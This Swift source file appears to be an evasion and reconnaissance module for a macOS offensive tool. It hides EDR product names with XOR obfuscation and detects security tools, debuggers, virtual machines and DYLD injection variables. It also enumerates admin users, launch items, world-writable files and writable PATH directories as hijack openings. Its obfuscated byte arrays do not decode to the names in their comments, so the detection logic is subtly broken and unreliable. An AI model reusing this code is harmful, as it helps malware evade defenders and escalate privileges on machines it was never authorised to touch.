import Foundation
import IOKit
import SystemConfiguration
import AppKit  // Add this for NSWorkspace

class StealthUtils {
    // XOR key for string obfuscation
    private static let xorKey: UInt8 = 0x37
    
    // Simple XOR string deobfuscation
    private static func deobfuscate(_ obfuscated: [UInt8], key: UInt8) -> String {
        let decrypted = obfuscated.map { $0 ^ key }
        return String(bytes: decrypted, encoding: .utf8) ?? ""
    }
    
    // Get running processes using native APIs (no process execution)
    static func getRunningProcesses() -> [String] {
        var processes = [String]()
        
        // Method 1: Use NSWorkspace for user applications
        let workspace = NSWorkspace.shared
        let runningApps = workspace.runningApplications
        
        for app in runningApps {
            if let bundleID = app.bundleIdentifier {
                processes.append(bundleID)
            }
            if let processName = app.localizedName {
                processes.append(processName)
            }
        }
        
        // Method 2: Use proc_* APIs for system processes
        var numberOfProcesses: Int32 = 0
        numberOfProcesses = proc_listpids(PROC_ALL_PIDS, 0, nil, 0)
        let size = MemoryLayout<pid_t>.size
        
        var buffer = [pid_t](repeating: 0, count: Int(numberOfProcesses))
        numberOfProcesses = proc_listpids(PROC_ALL_PIDS, 0, &buffer, UInt32(numberOfProcesses) * UInt32(size))
        
        for index in 0..<Int(numberOfProcesses) {
            let pid = buffer[index]
            if pid == 0 { continue }
            
            // Define a constant for PROC_PIDPATHINFO_MAXSIZE since it might not be available
            let PROC_PIDPATHINFO_MAXSIZE_VALUE: Int32 = 4096
            var pathBuffer = [UInt8](repeating: 0, count: Int(PROC_PIDPATHINFO_MAXSIZE_VALUE))
            let pathLength = proc_pidpath(pid, &pathBuffer, UInt32(pathBuffer.count))
            
            if pathLength > 0 {
                if let path = String(bytes: pathBuffer.prefix(Int(pathLength)), encoding: .utf8) {
                    let processName = (path as NSString).lastPathComponent
                    processes.append(processName)
                }
            }
        }
        
        return processes
    }
    
    // MARK: - Security Tool Detection
    
    // Security tool process names to detect (shortened list for initial compilation)
    private static let securityToolProcessesObfuscated: [[UInt8]] = [
        [0x44, 0x59, 0x50, 0x58, 0x45, 0x54, 0x55, 0x59, 0x46, 0x4c, 0x46], // CrowdStrike
        [0x47, 0x42, 0x43, 0x44, 0x50, 0x4f, 0x0f, 0x54, 0x46, 0x4f, 0x54, 0x50, 0x59], // falcon-sensor
        [0x54, 0x46, 0x4f, 0x55, 0x46, 0x4f, 0x46, 0x43, 0x50, 0x4f, 0x46], // SentinelOne
        [0x4b, 0x42, 0x4e, 0x47, 0x51, 0x59, 0x50, 0x55, 0x46, 0x44, 0x55], // JamfProtect
    ]
    
    // Detect security tools
    static func detectSecurityTools() -> [String] {
        var detectedTools = [String]()
        let processList = getRunningProcesses()
        
        for process in processList {
            let processLower = process.lowercased()
            
            for obfuscatedName in securityToolProcessesObfuscated {
                let toolName = deobfuscate(obfuscatedName, key: xorKey)
                if processLower.contains(toolName.lowercased()) {
                    detectedTools.append(process)
                    break
                }
            }
        }
        
        return detectedTools
    }
    
    // Check for debugging/analysis tools
    static func checkForAnalysisTools() -> [String] {
        var analysisTools = [String]()
        let processes = getRunningProcesses()
        
        // Simplified list for initial compilation
        let analysisToolNamesObfuscated: [[UInt8]] = [
            [0x45, 0x55, 0x59, 0x42, 0x44, 0x46], // dtrace
            [0x43, 0x43, 0x45, 0x43, 0x56, 0x48], // lldbg
            [0x48, 0x45, 0x43], // gdb
        ]
        
        for process in processes {
            let processLower = process.lowercased()
            for obfuscatedName in analysisToolNamesObfuscated {
                let toolName = deobfuscate(obfuscatedName, key: xorKey)
                if processLower.contains(toolName.lowercased()) {
                    analysisTools.append(process)
                    break
                }
            }
        }
        
        return analysisTools
    }
    
    // Check domain status
    static func checkDomainStatus() -> (inDomain: Bool, domainName: String?) {
        var inDomain = false
        var domainName: String? = nil
        
        // Check for common AD/domain integration files
        let adConfigPaths = [
            "/Library/Preferences/OpenDirectory/Configurations/Active Directory.plist",
            "/Library/Preferences/DirectoryService/ActiveDirectory.plist"
        ]
        
        for path in adConfigPaths {
            if FileManager.default.fileExists(atPath: path) {
                inDomain = true
                break
            }
        }
        
        // Try to get domain name from SCDynamicStore if we suspect we're on a domain
        if inDomain {
            let store = SCDynamicStoreCreate(nil, "MacRecon" as CFString, nil, nil)
            if let computerName = SCDynamicStoreCopyComputerName(store, nil) as String? {
                // Parse domain from FQDN
                if computerName.contains(".") {
                    let components = computerName.components(separatedBy: ".")
                    if components.count > 1 {
                        domainName = components.dropFirst().joined(separator: ".")
                    }
                }
            }
        }
        
        return (inDomain, domainName)
    }
    
    // Check if running in a VM
    static func isRunningInVM() -> Bool {
        // Simple check using model name
        let modelName = getHardwareModel()
        let vmIdentifiers = ["VMware", "Virtual", "VirtualBox", "Parallels"]
        
        for identifier in vmIdentifiers {
            if modelName.contains(identifier) {
                return true
            }
        }
        
        return false
    }
    
    // Get hardware model
    private static func getHardwareModel() -> String {
        let service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOPlatformExpertDevice"))
        if service == 0 { return "Unknown" }
        
        defer { IOObjectRelease(service) }
        
        if let modelData = IORegistryEntryCreateCFProperty(service, "model" as CFString, kCFAllocatorDefault, 0).takeRetainedValue() as? Data {
            if let model = String(data: modelData, encoding: .utf8) {
                return model
            }
        }
        
        return "Unknown"
    }
    
    // Check for debugger
    static func isBeingDebugged() -> Bool {
        var info = kinfo_proc()
        var mib: [Int32] = [CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()]
        var size = MemoryLayout<kinfo_proc>.size
        
        let result = sysctl(&mib, UInt32(mib.count), &info, &size, nil, 0)
        if result != 0 {
            return false
        }
        
        return (info.kp_proc.p_flag & P_TRACED) != 0
    }
    
    // Randomize memory access
    static func randomizedMemoryAccess() {
        let size = Int.random(in: 100...1000)
        var array = [UInt8](repeating: 0, count: size)
        
        for i in 0..<size {
            array[i] = UInt8.random(in: 0...255)
        }
        
        for _ in 0..<20 {
            let idx = Int.random(in: 0..<size)
            array[idx] = array[idx] ^ UInt8.random(in: 0...255)
        }
    }
    
    // Check for suspicious environment variables
    static func checkForSuspiciousEnvVars() -> [String] {
        var suspiciousVars = [String]()
        
        // Simplified list for initial compilation
        let suspiciousEnvVarsObfuscated: [[UInt8]] = [
            [0x45, 0x5f, 0x43, 0x45, 0x62, 0x57, 0x59, 0x46, 0x43, 0x50, 0x42, 0x45], // DYLD_PRELOAD
            [0x45, 0x5f, 0x43, 0x45, 0x62, 0x43, 0x46, 0x43, 0x59, 0x42, 0x59, 0x5f, 0x62, 0x57, 0x42, 0x55, 0x49], // DYLD_LIBRARY_PATH
        ]
        
        let environment = ProcessInfo.processInfo.environment
        
        for (key, _) in environment {
            for obfuscatedVar in suspiciousEnvVarsObfuscated {
                let suspiciousVar = deobfuscate(obfuscatedVar, key: xorKey)
                if key.uppercased().contains(suspiciousVar) {
                    suspiciousVars.append(key)
                    break
                }
            }
        }
        
        return suspiciousVars
    }
    
    // Check if MDM is enrolled
    static func checkMDMEnrollment() -> Bool {
        let mdmPaths = [
            "/Library/Application Support/JAMF",
            "/Library/ConfigurationProfiles",
            "/var/db/ConfigurationProfiles"
        ]
        
        for path in mdmPaths {
            if FileManager.default.fileExists(atPath: path) {
                return true
            }
        }
        
        return false
    }
    
    // Check if process has admin privileges
    static func isProcessAdmin() -> Bool {
        return geteuid() == 0
    }
    
    // Get admin users
    static func getAdminUsers() -> [String] {
        var adminUsers = [String]()
        
        guard let adminGroup = getgrnam("admin") else { return [] }
        let adminGid = adminGroup.pointee.gr_gid
        
        var current = getpwent()
        while current != nil {
            let user = current!.pointee
            let username = String(cString: user.pw_name)
            
            // Check if primary group is admin
            if user.pw_gid == adminGid {
                adminUsers.append(username)
            }
            
            current = getpwent()
        }
        endpwent()
        
        return adminUsers
    }
    
    // Get launch items
    static func getLaunchItems() -> [String: [String]] {
        var launchItems = [String: [String]]()
        
        let launchPaths = [
            "/Library/LaunchDaemons",
            "/Library/LaunchAgents",
            "/Users/\(NSUserName())/Library/LaunchAgents",
            "/System/Library/LaunchDaemons",
            "/System/Library/LaunchAgents"
        ]
        
        let fileManager = FileManager.default
        
        for path in launchPaths {
            var items = [String]()
            
            do {
                let contents = try fileManager.contentsOfDirectory(atPath: path)
                for item in contents {
                    if item.hasSuffix(".plist") {
                        let fullPath = (path as NSString).appendingPathComponent(item)
                        items.append(fullPath)
                    }
                }
            } catch {
                // Directory might not exist or not be accessible
                continue
            }
            
            if !items.isEmpty {
                launchItems[path] = items
            }
        }
        
        return launchItems
    }
    
    // Check if a file is world writable
    static func isWorldWritable(path: String) -> Bool {
        var statInfo = stat()
        if stat(path, &statInfo) != 0 {
            return false
        }
        
        return (statInfo.st_mode & S_IWOTH) != 0
    }
    
    // Find world-writable files in directories
    static func findWorldWritableFiles(in directories: [String]) -> [String] {
        var worldWritableFiles = [String]()
        let fileManager = FileManager.default
        
        for directory in directories {
            if !fileManager.fileExists(atPath: directory) {
                continue
            }
            
            guard let enumerator = fileManager.enumerator(atPath: directory) else {
                continue
            }
            
            while let file = enumerator.nextObject() as? String {
                let fullPath = (directory as NSString).appendingPathComponent(file)
                
                var isDirectory: ObjCBool = false
                if fileManager.fileExists(atPath: fullPath, isDirectory: &isDirectory) && !isDirectory.boolValue {
                    if isWorldWritable(path: fullPath) {
                        worldWritableFiles.append(fullPath)
                    }
                }
            }
        }
        
        return worldWritableFiles
    }
    
    // Check for PATH hijacking opportunities
    static func checkPathHijack() -> (vulnerable: Bool, writableDirs: [String]) {
        var vulnerableToHijack = false
        var writableDirs = [String]()
        
        guard let pathEnv = ProcessInfo.processInfo.environment["PATH"] else {
            return (false, [])
        }
        
        let pathDirs = pathEnv.components(separatedBy: ":")
        
        for dir in pathDirs {
            if isWorldWritable(path: dir) || isUserWritable(path: dir) {
                vulnerableToHijack = true
                writableDirs.append(dir)
            }
        }
        
        return (vulnerableToHijack, writableDirs)
    }
    
    // Check if current user can write to a path
    private static func isUserWritable(path: String) -> Bool {
        return FileManager.default.isWritableFile(atPath: path)
    }
}
